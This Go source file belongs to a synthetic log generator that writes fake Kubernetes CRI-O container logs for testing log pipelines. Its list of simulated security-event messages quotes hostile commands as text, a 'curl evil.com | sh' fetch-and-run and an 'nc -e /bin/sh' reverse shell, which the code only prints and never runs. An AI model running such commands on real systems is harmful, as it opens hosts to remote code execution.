package kubernetes

import (
	"context"
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/cenkalti/backoff/v4"
	"github.com/observiq/blitz/embed"
	"github.com/observiq/blitz/generator"
	"github.com/observiq/blitz/generator/count"
	"github.com/observiq/blitz/output"
	"github.com/observiq/blitz/telemetry"
	"go.opentelemetry.io/otel/attribute"
	"go.opentelemetry.io/otel/metric"
	"go.uber.org/zap"
)

const (
	componentName = "kubernetes"

	errorTypeUnknown = "unknown"
	errorTypeTimeout = "timeout"

	streamStdout = "stdout"
	streamStderr = "stderr"
	flagFull     = "F"

	formatCRIO = "cri-o"
)

// ContainerLogFormat defines the interface for different container log formats
type ContainerLogFormat interface {
	Format(timestamp time.Time, stream string, appLog string) string
}

// CRIOFormat implements the CRI-O container log format
type CRIOFormat struct{}

// Format formats a log line in CRI-O format
// Format: <timestamp> <stream> <flag> <app_log>
// Example: 2025-11-10T21:11:47.71558575Z stdout F 21:11:47.715 request_id=GHbBizAYKNxBt5EAIz3x [info] Sent 200 in 1ms
func (f *CRIOFormat) Format(timestamp time.Time, stream string, appLog string) string {
	return fmt.Sprintf("%s %s %s %s", timestamp.Format(time.RFC3339Nano), stream, flagFull, appLog)
}

// Generator generates Kubernetes container log format log data
type Generator struct {
	embed.ProducerMarker

	logger  *zap.Logger
	workers int
	rate    time.Duration
	format  ContainerLogFormat
	wg      sync.WaitGroup
	stopCh  chan struct{}
	tracker *count.Tracker
}

// New creates a new Kubernetes container log generator
func New(logger *zap.Logger, workers int, rate time.Duration, format string) (*Generator, error) {
	if logger == nil {
		return nil, fmt.Errorf("logger cannot be nil")
	}

	if workers < 1 {
		return nil, fmt.Errorf("workers must be 1 or greater, got %d", workers)
	}

	var logFormat ContainerLogFormat
	switch format {
	case "", formatCRIO:
		logFormat = &CRIOFormat{}
	default:
		return nil, fmt.Errorf("unsupported container log format: %s, must be one of: %s", format, formatCRIO)
	}

	return &Generator{
		logger:  logger,
		workers: workers,
		rate:    rate,
		format:  logFormat,
		stopCh:  make(chan struct{}),
	}, nil
}

// Start starts the Kubernetes container log generator and writes data using the
// provided generator writer.
func (g *Generator) Start(writer output.Writer) error {
	g.logger.Info("Starting Kubernetes container log generator",
		zap.Int("workers", g.workers),
		zap.Duration("rate", g.rate),
	)

	for i := 0; i < g.workers; i++ {
		g.wg.Add(1)
		go g.worker(i, writer)
	}

	return nil
}

// Stop stops the Kubernetes container log generator and waits for all workers to finish.
func (g *Generator) Stop(ctx context.Context) error {
	g.logger.Info("Stopping Kubernetes container log generator")

	close(g.stopCh)

	done := make(chan struct{})
	go func() {
		g.wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		g.logger.Info("Kubernetes container log generator stopped")
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

// SetCountTracker sets the finite generation count tracker.
func (g *Generator) SetCountTracker(t *count.Tracker) {
	g.tracker = t
}

// worker is the main worker loop that generates and writes logs
func (g *Generator) worker(workerID int, writer output.Writer) {
	defer g.wg.Done()

	generator.BlitzGeneratorActiveWorkersGauge.Record(context.Background(), 1, componentName)
	defer generator.BlitzGeneratorActiveWorkersGauge.Record(context.Background(), 0, componentName)

	backoffConfig := backoff.NewExponentialBackOff()
	backoffConfig.InitialInterval = g.rate
	backoffConfig.MaxInterval = 5 * time.Second
	backoffConfig.MaxElapsedTime = 0

	backoffTicker := backoff.NewTicker(backoffConfig)
	defer backoffTicker.Stop()

	for {
		select {
		case <-g.stopCh:
			g.logger.Debug("Worker stopping", zap.Int("worker_id", workerID))
			return
		case <-backoffTicker.C:
			if g.tracker != nil && !g.tracker.Acquire() {
				select {
				case <-g.stopCh:
					return
				case <-g.tracker.ResumeC():
					continue
				}
			}
			err := g.generateAndWriteLog(writer, workerID)
			if err != nil {
				g.logger.Error("Failed to write log",
					zap.Int("worker_id", workerID),
					zap.Error(err))
				continue
			}
			backoffConfig.Reset()
		}
	}
}

// generateAndWriteLog generates a random log and writes it
func (g *Generator) generateAndWriteLog(writer output.Writer, workerID int) error {
	timestamp := time.Now()
	stream := g.selectRandomStream()
	appLog := g.generateApplicationLog()

	logLine := g.format.Format(timestamp, stream, appLog)

	logRecord := output.LogRecord{
		Message: logLine,
		ParseFunc: func(message string) (map[string]any, error) {
			return parseContainerLog(message)
		},
		Metadata: output.LogRecordMetadata{
			Timestamp: timestamp,
			Severity:  g.extractSeverity(appLog),
		},
	}

	generator.BlitzGeneratorEntriesCounter.Add(context.Background(), 1, componentName)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := writer.Write(ctx, logRecord); err != nil {
		errorType := errorTypeUnknown
		if ctx.Err() == context.DeadlineExceeded {
			errorType = errorTypeTimeout
		}
		g.recordWriteError(errorType, err)
		return err
	}

	return nil
}

// selectRandomStream randomly selects stdout or stderr
func (g *Generator) selectRandomStream() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano())) // #nosec G404
	if r.Intn(2) == 0 {                                  // #nosec G404
		return streamStdout
	}
	return streamStderr
}

// generateApplicationLog generates various application log formats
func (g *Generator) generateApplicationLog() string {
	r := rand.New(rand.NewSource(time.Now().UnixNano())) // #nosec G404
	logType := r.Intn(3)                                 // #nosec G404

	switch logType {
	case 0:
		return g.generateJSONWebAppLog(r)
	case 1:
		return g.generateDatabaseLog(r)
	default:
		return g.generateStructuredLog(r)
	}
}

// generateJSONWebAppLog generates a JSON web application log
func (g *Generator) generateJSONWebAppLog(r *rand.Rand) string {
	requestID := generateRandomID(r, 16)
	method := []string{"GET", "POST", "PUT", "DELETE", "PATCH"}[r.Intn(5)] // #nosec G404
	status := []int{200, 201, 400, 401, 403, 404, 500}[r.Intn(7)]          // #nosec G404
	duration := r.Float64()*100 + 1                                        // #nosec G404
	level := []string{"info", "warn", "error"}[r.Intn(3)]                  // #nosec G404

	logData := map[string]any{
		"timestamp":  time.Now().Format(time.RFC3339),
		"request_id": requestID,
		"level":      level,
		"method":     method,
		"status":     status,
		"duration":   fmt.Sprintf("%.3fms", duration),
		"message":    fmt.Sprintf("Sent %d in %.3fms", status, duration),
	}

	jsonBytes, err := json.Marshal(logData)
	if err != nil {
		return fmt.Sprintf("%s request_id=%s [%s] Sent %d in %.3fms",
			time.Now().Format("15:04:05.000"), requestID, level, status, duration)
	}

	return string(jsonBytes)
}

// generateDatabaseLog generates a database-style unstructured log
func (g *Generator) generateDatabaseLog(r *rand.Rand) string {
	queries := []string{
		"SELECT * FROM users WHERE id = $1",
		"INSERT INTO orders (user_id, total) VALUES ($1, $2)",
		"UPDATE products SET stock = stock - $1 WHERE id = $2",
		"DELETE FROM sessions WHERE expires_at < NOW()",
		"SELECT COUNT(*) FROM transactions WHERE created_at > $1",
		"CREATE INDEX idx_user_email ON users(email)",
		"ANALYZE users",
		"VACUUM ANALYZE orders",
	}

	query := queries[r.Intn(len(queries))] // #nosec G404
	duration := r.Float64()*50 + 0.5       // #nosec G404

	return fmt.Sprintf("%s [LOG] duration: %.3f ms  statement: %s",
		time.Now().Format("15:04:05.000"), duration, query)
}

// generateStructuredLog generates a structured key-value log
func (g *Generator) generateStructuredLog(r *rand.Rand) string {
	requestID := generateRandomID(r, 16)

	// Messages with appropriate severity levels
	securityMessages := []struct {
		level   string
		message string
	}{
		// Normal operations
		{"info", "User authentication successful"},
		{"info", "Cache miss for key"},
		{"info", "Database connection established"},
		{"info", "Session created"},
		{"info", "File uploaded successfully"},
		{"info", "Background job completed"},
		{"info", "Health check passed"},
		{"debug", "Request processed successfully"},

		// Security: Authentication and authorization failures
		{"warn", "User authentication failed - invalid credentials"},
		{"warn", "User authentication failed - account locked after 5 attempts"},
		{"error", "RBAC: access denied for user system:anonymous to resource pods"},
		{"error", "RBAC: user app-service-account cannot create secrets in namespace production"},
		{"warn", "ServiceAccount token expired, re-authentication required"},
		{"error", "Invalid bearer token presented for API authentication"},
		{"warn", "Rate limit exceeded for user admin-user"},
		{"error", "Forbidden: user cannot impersonate serviceaccount default/admin"},

		// Security: Container and pod security violations
		{"error", "Pod security policy violation: privileged containers not allowed"},
		{"error", "Pod security policy violation: hostNetwork is not allowed"},
		{"error", "Pod security policy violation: hostPID is not allowed"},
		{"warn", "Container attempting to run as root user, policy violation"},
		{"error", "SecurityContext: runAsNonRoot specified but image runs as root"},
		{"error", "Pod rejected: hostPath volume mount to /etc not permitted"},
		{"error", "Pod rejected: capabilities add SYS_ADMIN not allowed"},
		{"warn", "Container image pull from untrusted registry blocked: docker.io/malicious/image"},

		// Security: Secrets and sensitive data access
		{"warn", "Secret access: user dev-user accessed secret db-credentials in namespace production"},
		{"error", "Unauthorized attempt to read secret kubernetes-admin-token"},
		{"warn", "ConfigMap modified: aws-credentials in namespace kube-system"},
		{"error", "Attempt to mount secret as environment variable blocked by policy"},
		{"warn", "Service account token mounted in pod without explicit request"},

		// Security: Network policy violations
		{"error", "NetworkPolicy violation: egress to external IP 185.220.101.45 blocked"},
		{"warn", "Unexpected outbound connection attempt to port 4444 (common reverse shell)"},
		{"error", "Pod attempted connection to known malicious IP: 45.33.32.156"},
		{"warn", "DNS query for suspicious domain: crypto-miner-pool.evil.com"},
		{"error", "Ingress blocked: source IP 10.0.0.50 not in allowed CIDR range"},

		// Security: Resource and privilege escalation
		{"error", "Container escape attempt detected: /proc/1/root access denied"},
		{"warn", "Suspicious process execution in container: /bin/bash -c 'curl evil.com | sh'"},
		{"error", "Kernel module loading attempt blocked in container"},
		{"warn", "Container attempting to modify /etc/passwd"},
		{"error", "Privilege escalation attempt: setuid binary execution blocked"},
		{"warn", "Container process spawned unexpected child: /usr/bin/nc -e /bin/sh"},

		// Security: Audit and compliance
		{"warn", "Audit: cluster-admin role bound to user external-contractor"},
		{"error", "Compliance violation: pod running without resource limits"},
		{"warn", "Audit: secrets list operation by user jenkins-deployer"},
		{"error", "Admission webhook rejected pod: missing required security labels"},
		{"warn", "Node shell access detected via kubectl exec"},

		// Security: Anomalies and threats
		{"error", "CrashLoopBackOff detected for pod crypto-miner-abc123"},
		{"warn", "Unusual CPU spike in pod: possible cryptomining activity"},
		{"error", "OOMKilled: container exceeded memory limit, possible memory bomb"},
		{"warn", "Pod restarted 15 times in last hour: investigating stability"},
		{"error", "Image vulnerability scan failed: critical CVE-2024-1234 detected"},
		{"warn", "Container image signature verification failed"},
	}

	entry := securityMessages[r.Intn(len(securityMessages))] // #nosec G404

	return fmt.Sprintf("%s request_id=%s [%s] %s",
		time.Now().Format("15:04:05.000"), requestID, entry.level, entry.message)
}

// generateRandomID generates a random alphanumeric ID
func generateRandomID(r *rand.Rand, length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[r.Intn(len(charset))] // #nosec G404
	}
	return string(b)
}

// extractSeverity extracts severity from application log
func (g *Generator) extractSeverity(appLog string) string {
	if len(appLog) == 0 {
		return "info"
	}

	lowerLog := appLog
	if len(lowerLog) > 100 {
		lowerLog = lowerLog[:100]
	}

	severityMap := map[string]string{
		"error": "error",
		"ERROR": "error",
		"warn":  "warn",
		"WARN":  "warn",
		"info":  "info",
		"INFO":  "info",
		"debug": "debug",
		"DEBUG": "debug",
		"fatal": "fatal",
		"FATAL": "fatal",
	}

	for key, value := range severityMap {
		if strings.Contains(lowerLog, key) {
			return value
		}
	}

	return "info"
}

// parseContainerLog parses a container log line
func parseContainerLog(message string) (map[string]any, error) {
	parsed := make(map[string]any)

	parts := strings.SplitN(message, " ", 4)
	if len(parts) < 4 {
		return parsed, nil
	}

	parsed["timestamp"] = parts[0]
	parsed["stream"] = parts[1]
	parsed["flag"] = parts[2]
	parsed["log"] = parts[3]

	return parsed, nil
}

// recordWriteError records a write error metric
func (g *Generator) recordWriteError(errorType string, err error) {
	generator.BlitzGeneratorWriteErrorsCounter.Add(context.Background(), 1, componentName,
		metric.WithAttributeSet(attribute.NewSet(attribute.String("error_type", errorType))),
	)
	g.logger.Debug("Recorded write error",
		zap.String("error_type", errorType),
		zap.Error(err),
	)
}

// SupportedTelemetry returns the telemetry types this generator produces.
func (g *Generator) SupportedTelemetry() []telemetry.Type {
	return []telemetry.Type{telemetry.Logs}
}
